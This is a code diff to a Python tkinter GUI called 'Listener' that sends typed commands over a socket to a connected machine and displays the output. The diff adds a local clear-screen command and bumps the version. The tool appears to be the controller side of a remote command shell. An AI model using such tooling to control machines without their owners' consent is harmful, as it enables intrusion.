@@ -38,23 +38,28 @@ class Listener():
     def execute_command(self, event = None):
         global command_output
         command_input = command_line.get("1.0", tkinter.END).strip()
-        try:
-            connection1.send(command_input.encode("utf-8"))
+        
+        if command_input == "clear" or command_input == "cls":
+            output_text.delete("1.0", tkinter.END)
+        
+        else:
+            try:
+                connection1.send(command_input.encode("utf-8"))
 
-            command_output = connection1.recv(2048)
-            output_text.insert(tkinter.END, command_output)
-            output_text.see(tkinter.END)
+                command_output = connection1.recv(2048)
+                output_text.insert(tkinter.END, command_output)
+                output_text.see(tkinter.END)
 
-        except Exception as e:
+            except Exception as e:
 
-            connection_situation.delete("1.0", tkinter.END)
-            connection_situation.insert(tkinter.END, "DISCONNECTED")
+                connection_situation.delete("1.0", tkinter.END)
+                connection_situation.insert(tkinter.END, "DISCONNECTED")
 
-            adress_situation.delete("1.0", tkinter.END)
-            adress_situation.insert(tkinter.END, "Error")
+                adress_situation.delete("1.0", tkinter.END)
+                adress_situation.insert(tkinter.END, "Error")
 
-            error_situation.delete("1.0", tkinter.END)
-            error_situation.insert(tkinter.END, str(e))
+                error_situation.delete("1.0", tkinter.END)
+                error_situation.insert(tkinter.END, str(e))
 
         command_line.delete("1.0", tkinter.END)
         return "break"
@@ -194,7 +199,7 @@ if __name__ == "__main__":
 
 
 #=======================================================================================================#
-    version_label = tkinter.Label(_frame, text="Listener 1.3", bg="#303030", fg="lightgray")
+    version_label = tkinter.Label(_frame, text="Listener 1.4", bg="#303030", fg="lightgray")
     version_label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
 
     devops_label = tkinter.Label(_frame, text="Developed By Atahan Poyraz", bg="#303030", fg="lightgray")
